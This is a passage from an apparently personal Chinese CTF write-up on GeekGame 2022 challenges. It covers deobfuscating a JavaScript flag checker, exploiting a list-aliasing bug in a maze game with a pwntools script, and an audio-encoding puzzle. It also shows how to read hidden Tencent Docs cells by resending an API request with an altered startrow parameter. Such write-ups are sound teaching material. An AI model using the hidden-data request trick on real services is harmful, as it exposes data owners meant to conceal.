class="mi">33</span><span class="p">,</span><span class="mi">232</span><span class="p">].</span><span class="nx">map</span><span class="p">(</span>
            <span class="kd">function</span><span class="p">(</span><span class="nx">y</span><span class="p">){</span>
                <span class="k">return</span> <span class="p">(</span><span class="nx">checkflag2</span><span class="o">+</span> <span class="dl">''</span><span class="p">).</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">y</span><span class="p">)</span>
            <span class="p">}))?</span><span class="dl">'</span><span class="s1">Correct</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">Wrong</span><span class="dl">'</span><span class="p">)}</span>
</code></pre></div></div>

<p>函数加上字符串是个啥玩意啊：</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>node
<span class="go">Welcome to Node.js v19.1.0.
Type ".help" for more information.
</span><span class="gp">&gt;</span><span class="w"> </span>// 把 checkflag2 扔进去，略
<span class="go">undefined
</span><span class="gp">&gt;</span><span class="w"> </span>checkflag2 + <span class="s1">''</span>
<span class="gp">"function checkflag2(_0xa83ex2){var _0x724b=['charCodeAt','map','','split','stringify','Correct','Wrong','j-'];</span><span class="k">return</span> <span class="o">(</span>JSON[_0x724b[4]]<span class="o">(</span>_0xa83ex2[_0x724b[3]]<span class="o">(</span>_0x724b[2]<span class="o">)[</span>_0x724b[1]]<span class="o">(</span><span class="k">function</span><span class="o">(</span>_0xa83ex3<span class="o">){</span><span class="k">return </span>_0xa83ex3[_0x724b[0]]<span class="o">(</span>0<span class="o">)}))==</span> JSON[_0x724b[4]]<span class="o">([</span>0,15,16,17,30,105,16,31,16,67,3,33,5,60,4,106,6,41,0,1,67,3,16,4,6,33,232][_0x724b[1]]<span class="o">(</span><span class="k">function</span><span class="o">(</span>_0xa83ex3<span class="o">){</span><span class="k">return</span> <span class="o">(</span>checkflag2+ _0x724b[2]<span class="o">)[</span>_0x724b[0]]<span class="o">(</span>_0xa83ex3<span class="o">)}))</span>?_0x724b[5]:_0x724b[6]<span class="o">)}</span><span class="s2">"
</span></code></pre></div></div>

<p>哦就是程序源代码的字符串啊，那简单：</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span>JSON.stringify<span class="o">([</span>0,15,16,17,30,105,16,31,16,67,3,33,5,60,4,106,6,41,0,1,67,3,16,4,6,33,232].map<span class="o">((</span>x<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span><span class="k">return</span> <span class="o">(</span>checkflag2+<span class="s1">''</span><span class="o">)</span>.charCodeAt<span class="o">(</span>x<span class="o">)}))</span>
<span class="go">'[102,108,97,103,123,106,97,118,97,115,99,114,105,112,116,45,111,98,102,117,115,99,97,116,111,114,125]'
</span></code></pre></div></div>

<p>扔 Python 跑：</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span>python
<span class="go">Python 3.10.8 (main, Nov  1 2022, 14:18:21) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
</span><span class="gp">&gt;</span><span class="o">&gt;&gt;</span> chr<span class="o">(</span>102<span class="o">)</span>
<span class="go">'f'
</span><span class="gp">&gt;</span><span class="o">&gt;&gt;</span> x <span class="o">=</span> <span class="o">[</span>102,108,97,103,123,106,97,118,97,115,99,114,105,112,116,45,111,98,102,117,115,99,97,116,111,114,125]
<span class="gp">&gt;</span><span class="o">&gt;&gt;</span> <span class="k">for </span>i <span class="k">in </span>x:
<span class="go">...     print(chr(i), end='')
</span><span class="c">... 
</span><span class="gp">flag{javascript-obfuscator}&gt;</span><span class="o">&gt;&gt;</span>
</code></pre></div></div>

<h2 id="智慧检测器">智慧检测器</h2>

<h3 id="flag-1不存在的楼层">Flag 1：不存在的楼层</h3>

<p>首先跑跑看可以看出这是个走迷宫的程序，而且上下左右得用东南西北来指代（经常搞不清楚往某个方向走应该输入什么）。然后再跑跑（或者去看源代码）可以发现，第二/三关要走到最上层才能出去，以及，诶我是不是可以卡墙里啊？</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Here is a maze challenge with 3 levels.
Clear each level within 99 moves to get the flag.
Good luck!
Start: [0, 1, 5]
Teleports: {}
CurPos: [0, 1, 5]
#######
#    @#
# X X #
#   X #
#   X #
#     #
#####E#
Input direction and press enter. Available directions: SW R(estart)
WWWWWWWWWWWWW
['W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W', 'W']
Invalid Direction
CurPos: [0, 1, 0]
#######
@     #
#XX   #
#     #
#     #
#     #
#####E#
Input direction and press enter. Available directions: E R(estart)
</code></pre></div></div>

<p>然后发现，只要第一步没问题，后面遇到有问题的前进方向的时候，程序会晚一步才停一下，所以可以事实上穿过厚度为 1 的墙。但是其实你能做到的事情不止穿墙那么简单：第二关你可以用 U 上楼，D 下楼。让我们在第一关试试吧！</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Input direction and press enter. Available directions: WE R(estart)
WUUU
Invalid Direction
got &lt;class 'IndexError'&gt;
flag{gAme.exe-stops-reSponDing...send-error-Report?}
</code></pre></div></div>

<p>获得 flag1。</p>

<p>程序的关键问题在第 422 行：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">CurPos</span> <span class="o">=</span> <span class="n">NewPos</span>
</code></pre></div></div>

<p>这里 <code class="language-plaintext highlighter-rouge">CurPos</code> 和 <code class="language-plaintext highlighter-rouge">NewPos</code> 都是 <code class="language-plaintext highlighter-rouge">list</code>，<code class="language-plaintext highlighter-rouge">CurPos</code> 是我当前的位置，<code class="language-plaintext highlighter-rouge">NewPos</code> 是我提供的输入序列遍历的时候的位置。第一下没问题的话，这一行就被执行，然后 <code class="language-plaintext highlighter-rouge">CurPos</code> 和 <code class="language-plaintext highlighter-rouge">NewPos</code> 两个变量就事实上<strong>指向同一个列表</strong>（要知道复制一个大的对象的操作是很慢的，所以这么实现也合情合理）！</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">x</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">]</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">y</span> <span class="o">=</span> <span class="n">x</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="mi">114</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">y</span>
<span class="p">[</span><span class="mi">114</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">]</span>
</code></pre></div></div>

<p>正确的做法：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">x</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">]</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">y</span> <span class="o">=</span> <span class="n">x</span><span class="p">[:]</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="mi">114</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">y</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">]</span>
</code></pre></div></div>

<p>尽管程序有检查，但是代码逻辑是先 commit 到 NewPos 再检查执行是否正确，于是我们可以做一次错误的操作（第二次会因为第一次操作越界直接停止而不会被执行）。</p>

<h3 id="flag-2直穿终点">Flag 2：直穿终点</h3>

<p>至于 flag2，首先有了武功秘籍（指穿墙和穿楼层）之后前两关简直小事一桩。第三关也类似，先冲到最上面一层，然后靠穿墙直冲终点，步数是够用的。第二阶段给的提示是「第三关可以开局先去看看终点的位置在哪里，然后按 R 重新开始」，但是在我看来这个提示的操作是没有必要的。</p>

<p>但是因为层数实在太多，还是写程序吧。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"prob03.geekgame.pku.edu.cn"</span><span class="p">,</span> <span class="mi">10003</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">"token: "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"&lt;your token&gt;"</span><span class="p">)</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">map_</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">"Input"</span><span class="p">)</span>
    <span class="n">x</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">"start)</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">map_</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
    <span class="k">if</span> <span class="sa">b</span><span class="s">"E"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">map_</span><span class="p">:</span>
        <span class="n">available_op</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">available_op</span><span class="p">)</span>
        <span class="n">available_op</span> <span class="o">=</span> <span class="n">available_op</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">"U"</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">available_op</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">user</span> <span class="o">=</span> <span class="nb">input</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">user</span><span class="p">)</span>
</code></pre></div></div>

<p>因为我不想写在最顶层判断怎么走的逻辑，所以如果发现这一层迷宫里有 E，那么就让用户输入序列，否则自动爬楼梯。</p>

<h2 id="我用-108-天录了个音部分第二阶段">我用 108 天录了个音（部分，第二阶段）</h2>

<blockquote>
  <p>CTF 并带着趣味（10 秒）不觉得这很酷吗（10 秒）作为一名——呃——CS 学生（10 秒）我觉得这太酷了（10 秒）很符合我对 GeekGame 的想象</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>科技并带着趣味
不觉得这很酷吗
作为一名理工男
我觉得这太酷了
很符合我对未来生活的想象
</code></pre></div></div>

<p>第二阶段之前，我拿 Azure 的语音合成接口生成了这五句话（学生邮箱可以弄到免费的额度，Mac 用户应该可以更省事，直接用 <code class="language-plaintext highlighter-rouge">say</code> 生成），然后基本确定了要用 ogg + opus 编码，然后拿 Audacity 拼接五段音频，但是只能生成出 20 多 KB 的文件，两方面都不符合要求。</p>

<p>第二阶段看了提示，发现失误就在于拿 Audacity 拼音频——我应该直接用 cat 的喵。</p>

<p>作为参考，我的编码参数为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffmpeg -i 1new.wav -vn -c:a libopus -b:a 10k -ac 1 -ar 8000 -page_duration 0 -application voip -vbr constrained -filter:a "atempo=1.2" 1.ogg
</code></pre></div></div>

<p>但是静音部分还是搞不清楚怎么缩小到 0.5KB。最后目录的文件大小情况如下：</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-lha</span>
<span class="go">total 1.2M
drwxr-xr-x 1 taoky taoky  194 Nov 25 14:31 ./
drwxr-xr-x 1 taoky taoky  446 Nov 25 14:32 ../
-rw-r--r-- 1 taoky taoky  37K Nov 25 13:52 1new.wav
-rw-r--r-- 1 taoky taoky 1.5K Nov 25 14:01 1.ogg
-rw-r--r-- 1 taoky taoky  38K Nov 25 13:53 2new.wav
-rw-r--r-- 1 taoky taoky 1.5K Nov 25 14:02 2.ogg
-rw-r--r-- 1 taoky taoky  42K Nov 25 13:54 3new.wav
-rw-r--r-- 1 taoky taoky 1.6K Nov 25 14:02 3.ogg
-rw-r--r-- 1 taoky taoky  38K Nov 25 13:55 4new.wav
-rw-r--r-- 1 taoky taoky 1.4K Nov 25 14:03 4.ogg
-rw-r--r-- 1 taoky taoky  65K Nov 25 13:56 5new.wav
-rw-r--r-- 1 taoky taoky 2.2K Nov 25 14:30 5.ogg
-rw-r--r-- 1 taoky taoky  23K Nov 25 14:31 result.ogg
-rw-r--r-- 1 taoky taoky 3.7K Nov 25 14:04 silence.ogg
-rw-r--r-- 1 taoky taoky 862K Nov 25 13:57 silence.wav
</span></code></pre></div></div>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span><span class="nb">cat </span>1.ogg silence.ogg 2.ogg silence.ogg 3.ogg silence.ogg 4.ogg silence.ogg 5.ogg <span class="o">&gt;</span> result.ogg
<span class="gp">&gt;</span><span class="w"> </span>ffprobe <span class="nt">-f</span> ogg <span class="nt">-ac</span> 1 <span class="nt">-ar</span> 8000 ./result.ogg <span class="nt">-show_entries</span> <span class="nv">format</span><span class="o">=</span>duration <span class="nt">-print_format</span> json
<span class="go">// 省略部分输出
</span><span class="gp">Input #</span>0, ogg, from <span class="s1">'./result.ogg'</span>:
<span class="go">  Duration: 00:00:01.60, start: 0.000000, bitrate: 114 kb/s
</span><span class="gp">  Stream #</span>0:0: Audio: opus, 48000 Hz, mono, fltp
<span class="go">    Metadata:
      encoder         : Lavc59.37.100 libopus
    "format": {
        "duration": "1.601000"
    }
}
</span></code></pre></div></div>

<p>ffprobe 似乎只会输出最后一段音频的长度。上传即可。作为参考，这是<a href="/pictures/geekgame-2022/result.ogg">我上传的 ogg 文件</a>。</p>

<h2 id="企鹅文档">企鹅文档</h2>

<p>只在前端隐藏单元格的屑文档。虽然我感觉拿这个出题不太好，并且不确定性因素也有点太大了。</p>

<p>F12 看请求，发现 <code class="language-plaintext highlighter-rouge">dop-api/get/sheet</code> 里面好像有好东西：</p>

<p><img src="/pictures/geekgame-2022/qqdoc1.png" alt="Tencent Docs Request"></p>

<p><img src="/pictures/geekgame-2022/qqdoc2.png" alt="Tencent Docs Response"></p>

<p>然后可以拼出 <code class="language-plaintext highlighter-rouge">BzRJEs_next</code>，这玩意可不在表格里啊。我们能不能拿到整个表格的数据呢？答案是可以的，只要把 startrow 参数从 61 调到 0 就行，用 Firefox 的 Edit and Resend，可以收到下面的东西：</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"1"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"h"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"2"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"t"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"3"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"t"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"4"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"p"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"5"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"s"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"6"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">":"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"7"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"/"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"8"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"/"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"9"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"g"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"10"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"e"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"11"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"e"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"12"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"k"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"13"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"g"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"14"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"a"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"15"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"m"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"16"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"e"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"17"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"."</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"18"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"p"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"19"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"k"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"20"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"u"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"21"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"."</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"22"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"e"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"23"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"d"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"24"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"u"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"25"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"."</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"26"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"c"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"27"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"n"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"28"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"/"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"29"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"s"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"30"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"e"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"31"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"r"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"32"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"v"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"33"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"i"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"34"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"c"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"35"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"e"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"36"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"/"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"37"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"t"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"38"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"e"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"39"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"m"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"40"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"p"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"41"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"l"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"42"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span 